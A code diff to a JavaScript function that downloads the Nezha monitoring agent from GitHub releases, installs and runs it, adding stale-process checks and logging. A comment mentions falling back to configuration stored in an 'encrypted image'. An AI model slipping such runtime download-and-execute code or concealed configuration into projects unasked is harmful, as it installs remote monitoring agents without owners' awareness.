@@ -202,8 +202,14 @@ function isProcessAlive(pid) {
 // ========== Core startup ==========
 async function startNezhaAgent() {
     try {
-        if (agentProcess && isProcessAlive(agentProcess.pid)) {
+        // 检查 agentProcess 是否真的在跑 + 二进制存在
+        if (agentProcess && isProcessAlive(agentProcess.pid) && existsSync(AGENT_BIN)) {
             return true;
+        }
+        // 如果 agentProcess 是 stale 的，重置
+        if (agentProcess && !existsSync(AGENT_BIN)) {
+            console.log('[Nezha] agent bin missing, resetting agentProcess');
+            agentProcess = null;
         }
 
         // 优先用环境变量，没有再 fallback 到加密图片
@@ -234,7 +240,13 @@ async function startNezhaAgent() {
             const rawUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
 
             ensureDir(TMP_DIR);
-            await fetchFileWithFallback(rawUrl, ZIP_PATH);
+            try {
+                await fetchFileWithFallback(rawUrl, ZIP_PATH);
+                console.log('[Nezha] agent zip downloaded to', ZIP_PATH);
+            } catch (e) {
+                console.log('[Nezha] agent zip download failed:', e.message);
+                return false;
+            }
 
             if (existsSync(CACHE_DIR)) rmSync(CACHE_DIR, { recursive: true, force: true });
             ensureDir(CACHE_DIR);
@@ -254,7 +266,9 @@ async function startNezhaAgent() {
             if (existsSync(originBin)) {
                 fs.renameSync(originBin, AGENT_BIN);
                 chmodSync(AGENT_BIN, 0o755);
+                console.log('[Nezha] agent binary downloaded and installed');
             } else {
+                console.log('[Nezha] agent binary not found in zip, download failed');
                 return false;
             }
         }
